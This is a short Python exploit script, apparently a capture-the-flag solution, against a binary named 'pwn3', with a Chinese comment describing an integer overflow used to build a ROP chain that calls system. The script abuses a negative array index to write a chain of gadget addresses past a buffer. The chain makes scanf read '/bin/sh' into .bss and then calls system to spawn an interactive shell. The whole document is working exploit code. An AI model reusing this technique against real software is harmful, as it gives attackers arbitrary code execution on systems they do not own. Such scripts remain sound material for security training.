# 整数溢出，构造ROP，有system函数
from zio import *
from pwn import *

io = zio('./pwn3', timeout=999999)
exe = elf.ELF('./pwn3')

scanf_addr = exe.plt['__isoc99_scanf']
system_addr = exe.plt['system']
bss_addr = exe.bss()

ret = 0x80483c6
popret = 0x80483dd
pop2ret = 0x80487de
pop3ret = 0x80487dd
pop4ret = 0x80487dc
leaveret = 0x80484e8
addesp_12 = 0x80483da
addesp_44 = 0x80487d9
_9s = 0x0804884B

def set_data(idx, value):
	io.read_until('index')
	io.writeline(str(idx))

	io.read_until('value')
	io.writeline(str(value))


io.read_until('name')
io.writeline('my_name')

base = -0x80000000
rop_chain = [scanf_addr, pop2ret,  _9s, bss_addr, system_addr, 0xdeadbeef, bss_addr ]
rop_chain += [0xdeadbeef] * 3

idx = 0
io.gdb_hint(breakpoints= [0x08048680])
for i in rop_chain:
	set_data(base + 14 + idx, i)
	idx += 1
	

io.read_until_timeout()
io.writeline('/bin/sh ')
io.read_until_timeout()

io.interact()